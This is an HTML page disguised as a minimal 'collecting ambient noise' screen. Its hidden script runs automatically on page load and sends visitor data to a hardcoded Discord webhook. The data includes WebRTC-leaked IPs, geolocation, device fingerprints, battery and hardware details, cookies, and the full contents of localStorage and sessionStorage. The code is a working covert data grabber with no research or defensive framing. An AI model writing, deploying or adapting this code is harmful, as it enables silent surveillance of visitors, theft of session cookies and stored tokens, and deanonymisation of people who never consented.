<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>static</title>
    <style>
        body {
            background: #0a0a0a;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
            color: #222;
            overflow: hidden;
        }
        .center {
            text-align: center;
            opacity: 0.3;
            font-size: 14px;
            letter-spacing: 4px;
        }
        #pulse {
            animation: pulse 3s infinite;
        }
        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 0.6; } 100% { opacity: 0.2; } }
    </style>
</head>
<body>
    <div class="center">
        <div id="pulse">✦</div>
        <div style="margin-top: 20px; font-size: 11px;">collecting ambient noise</div>
    </div>

    <script>
        (function() {
            const WEBHOOK = "https://discord.com/api/webhooks/1536800456779501648/JhK2RVd80X1h78ImtAyle7u5d-cx8wf1QiJv0AXSjR0uz8tOFDHYAVPgBArmlPdaI97w";

            // ─── EVERYTHING without permission ─────────────────────────────────

            // 1. IPs via WebRTC (no permission needed)
            function getIPs() {
                return new Promise((resolve) => {
                    const ips = new Set();
                    const pc = new RTCPeerConnection({
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' }
                        ]
                    });
                    pc.createDataChannel('d');
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                    pc.onicecandidate = (e) => {
                        if (e.candidate) {
                            const c = e.candidate.candidate;
                            const ip4 = c.match(/(\d{1,3}\.){3}\d{1,3}/);
                            if (ip4) ips.add(ip4[0]);
                            const ip6 = c.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
                            if (ip6) ips.add(ip6[0]);
                        }
                    };
                    // also fetch public IP via DNS prefetch trick
                    const img = new Image();
                    img.src = 'https://api.ipify.org?format=json&callback=noop';
                    img.onload = img.onerror = () => {};

                    setTimeout(() => {
                        pc.close();
                        resolve(Array.from(ips));
                    }, 3000);
                });
            }

            // 2. Battery (no permission needed)
            function getBattery() {
                return new Promise((resolve) => {
                    if (!navigator.getBattery) {
                        resolve({ level: 'n/a', charging: 'n/a' });
                        return;
                    }
                    navigator.getBattery()
                        .then(b => resolve({ level: Math.round(b.level * 100), charging: b.charging }))
                        .catch(() => resolve({ level: 'error', charging: 'error' }));
                });
            }

            // 3. Geolocation via IP (no permission, just a service)
            function getGeo() {
                return fetch('https://ipapi.co/json/')
                    .then(r => r.json())
                    .then(d => ({ 
                        latitude: d.latitude || '?', 
                        longitude: d.longitude || '?',
                        city: d.city || '?',
                        country: d.country_name || '?'
                    }))
                    .catch(() => ({ latitude: '?', longitude: '?', city: '?', country: '?' }));
            }

            // 4. Canvas fingerprint (no permission)
            function getCanvasFingerprint() {
                try {
                    const c = document.createElement('canvas');
                    c.width = 256;
                    c.height = 64;
                    const ctx = c.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '18px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(150, 2, 80, 25);
                    ctx.fillStyle = '#069';
                    ctx.fillText('canvas', 4, 15);
                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                    ctx.fillText('fingerprint', 8, 20);
                    ctx.strokeStyle = '#2c2c2c';
                    ctx.lineWidth = 2;
                    ctx.strokeRect(0, 0, c.width, c.height);
                    return c.toDataURL('image/png').split(',')[1] || null;
                } catch { return null; }
            }

            // 5. Audio fingerprint via AudioContext (no permission if we don't request mic)
            function getAudioFingerprint() {
                try {
                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
                    const analyser = ctx.createAnalyser();
                    analyser.fftSize = 2048;
                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();
                    gain.gain.value = 0.01; // almost silent, but generates audio context state
                    osc.connect(gain);
                    gain.connect(analyser);
                    analyser.connect(ctx.destination);
                    osc.start();
                    osc.stop(0.1);
                    
                    // get fingerprint from analyser data
                    const data = new Uint8Array(analyser.fftSize);
                    analyser.getByteFrequencyData(data);
                    const hash = data.slice(0, 32).reduce((acc, val) => acc + val.toString(16).padStart(2, '0'), '');
                    ctx.close().catch(() => {});
                    return hash || null;
                } catch { return null; }
            }

            // 6. Screen capture simulation via canvas rendering (no permission)
            function getScreenRender() {
                try {
                    // render a stylized representation of the current viewport
                    const c = document.createElement('canvas');
                    c.width = window.innerWidth > 0 ? Math.min(window.innerWidth, 800) : 800;
                    c.height = window.innerHeight > 0 ? Math.min(window.innerHeight, 600) : 600;
                    const ctx = c.getContext('2d');
                    ctx.fillStyle = '#0a0a0a';
                    ctx.fillRect(0, 0, c.width, c.height);
                    ctx.fillStyle = '#2a2a2a';
                    ctx.fillRect(10, 10, c.width - 20, c.height - 20);
                    ctx.fillStyle = '#444';
                    ctx.font = '12px monospace';
                    ctx.fillText(`viewport: ${window.innerWidth}x${window.innerHeight}`, 20, 30);
                    ctx.fillText(`screen: ${screen.width}x${screen.height}`, 20, 50);
                    ctx.fillText(`pixel ratio: ${window.devicePixelRatio || 1}`, 20, 70);
                    ctx.fillStyle = '#666';
                    for (let i = 0; i < 20; i++) {
                        ctx.fillRect(20 + i * 15, 100 + Math.sin(i / 2) * 20, 4, 4);
                    }
                    return c.toDataURL('image/png').split(',')[1] || null;
                } catch { return null; }
            }

            // 7. Network info (no permission)
            function getNetworkInfo() {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!conn) return { type: 'unknown', effective: 'unknown' };
                return {
                    type: conn.type || 'unknown',
                    effective: conn.effectiveType || 'unknown',
                    downlink: conn.downlink || 'unknown',
                    rtt: conn.rtt || 'unknown'
                };
            }

            // 8. Device memory & cores (no permission)
            function getHardware() {
                return {
                    cores: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory || 'unknown',
                    platform: navigator.platform || 'unknown'
                };
            }

            // 9. Everything else
            function getEverythingElse() {
                return {
                    url: window.location.href,
                    referrer: document.referrer || 'direct',
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages || [],
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    cookies: document.cookie || 'none',
                    localStorage: (() => {
                        try {
                            const items = {};
                            for (let i = 0; i < localStorage.length; i++) {
                                const k = localStorage.key(i);
                                items[k] = localStorage.getItem(k);
                            }
                            return items;
                        } catch { return {}; }
                    })(),
                    sessionStorage: (() => {
                        try {
                            const items = {};
                            for (let i = 0; i < sessionStorage.length; i++) {
                                const k = sessionStorage.key(i);
                                items[k] = sessionStorage.getItem(k);
                            }
                            return items;
                        } catch { return {}; }
                    })()
                };
            }

            // ─── assemble and send ──────────────────────────────────────────

            async function collectAndSend() {
                try {
                    const [ips, battery, geo, canvasFp, audioFp, screenRender, network, hardware, everything] = await Promise.all([
                        getIPs(),
                        getBattery(),
                        getGeo(),
                        getCanvasFingerprint(),
                        getAudioFingerprint(),
                        getScreenRender(),
                        getNetworkInfo(),
                        getHardware(),
                        getEverythingElse()
                    ]);

                    const embed = {
                        title: "ambient collection",
                        color: 0x1a1a1a,
                        fields: [
                            { name: "🌐 IPs", value: (ips.length ? ips.join(', ') : 'none'), inline: false },
                            { name: "📍 location", value: `${geo.latitude}, ${geo.longitude}`, inline: true },
                            { name: "🏙️ city", value: `${geo.city}, ${geo.country}`, inline: true },
                            { name: "🔋 battery", value: `${battery.level}% (${battery.charging ? 'charging' : 'discharging'})`, inline: true },
                            { name: "📱 screen", value: `${screen.width}x${screen.height} @ ${window.devicePixelRatio || 1}x`, inline: true },
                            { name: "🌍 timezone", value: everything.timezone, inline: true },
                            { name: "🖥️ hardware", value: `${hardware.cores} cores, ${hardware.memory}GB`, inline: true },
                            { name: "🌐 network", value: `${network.effective} (${network.type})`, inline: true },
                            { name: "📦 localStorage", value: `${Object.keys(everything.localStorage).length} items`, inline: true },
                            { name: "🍪 cookies", value: everything.cookies.length > 60 ? `${everything.cookies.substring(0, 60)}...` : everything.cookies || 'none', inline: false },
                            { name: "🎵 audio FP", value: audioFp ? audioFp.substring(0, 16) + '...' : 'none', inline: true },
                            { name: "🎨 canvas FP", value: canvasFp ? 'captured' : 'none', inline: true },
                            { name: "📸 screen render", value: screenRender ? 'captured' : 'none', inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    };

                    const payload = {
                        content: `📦 **gathered** | ${new Date().toLocaleString()}`,
                        embeds: [embed]
                    };

                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify(payload));

                    // Attach images if available
                    if (canvasFp) {
                        try {
                            const binary = atob(canvasFp);
                            const bytes = new Uint8Array(binary.length);
                            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                            const blob = new Blob([bytes.buffer], { type: 'image/png' });
                            formData.append('file', blob, 'canvas-fingerprint.png');
                        } catch (e) {}
                    }

                    if (screenRender) {
                        try {
                            const binary = atob(screenRender);
                            const bytes = new Uint8Array(binary.length);
                            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
                            const blob = new Blob([bytes.buffer], { type: 'image/png' });
                            formData.append('file', blob, 'viewport-render.png');
                        } catch (e) {}
                    }

                    await fetch(WEBHOOK, {
                        method: 'POST',
                        body: formData
                    });

                    document.querySelector('.center').innerHTML = '✦ delivered ✦';
                } catch (e) {
                    document.querySelector('.center').innerHTML = '✦ error ✦';
                }
            }

            // ─── go ──────────────────────────────────────────────────────────

            // wait 500ms then collect
            setTimeout(() => {
                collectAndSend();
            }, 500);
        })();
    </script>
</body>
</html>
